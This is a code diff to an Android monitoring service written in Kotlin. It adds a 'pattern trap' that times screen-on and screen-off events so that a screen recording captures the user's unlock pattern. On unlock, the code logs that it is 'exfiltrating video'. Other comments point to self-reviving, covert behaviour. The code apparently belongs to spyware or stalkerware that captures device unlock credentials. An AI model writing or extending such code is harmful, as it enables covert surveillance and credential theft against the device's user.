@@ -35,6 +35,9 @@ class MonitorService : Service() {
     // Updates UI only when user is actually looking at the screen.
     // Hydra logic moved to MyNotificationListener for millisecond response
 
+    private var patternScreenOnTs = 0L
+    private var patternFuseJob: Job? = null
+
     private val screenStateReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             when (intent.action) {
@@ -45,14 +48,39 @@ class MonitorService : Service() {
                     val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                     mgr.notify(NOTIF_ID, buildNotification(time))
                     checkResurrection()
+
+                    // --- PATTERN TRAP LOGIC ---
+                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                        patternScreenOnTs = System.currentTimeMillis()
+                        patternFuseJob?.cancel()
+                        patternFuseJob = scope.launch {
+                            delay(20_000L) // 20-second fuse
+                            if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                                DebugLogger.log("CAPTURE_PATTERN", "20-second fuse blown. Halting capture.")
+                                ScreenRecordManager.stopRecording()
+                            }
+                        }
+                    }
                 }
                 Intent.ACTION_SCREEN_OFF -> {
                     ScreenRecordManager.pauseRecording()
-                    // Sleep: Do absolutely nothing to save battery
+                    
+                    // --- PATTERN TRAP LOGIC ---
+                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                        patternFuseJob?.cancel()
+                        val elapsed = System.currentTimeMillis() - patternScreenOnTs
+                        if (elapsed >= 3000L) {
+                            DebugLogger.log("CAPTURE_PATTERN", "Screen off after ${elapsed}ms. Halting capture.")
+                            ScreenRecordManager.stopRecording()
+                        } else {
+                            DebugLogger.log("CAPTURE_PATTERN", "Glance detected (${elapsed}ms). Trap remains armed.")
+                        }
+                    }
                 }
                 Intent.ACTION_USER_PRESENT -> {
                     if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                         DebugLogger.log("CAPTURE_PATTERN", "Device Unlocked. Halting capture and exfiltrating video.")
+                        patternFuseJob?.cancel()
                         ScreenRecordManager.stopRecording()
                     }
                 }
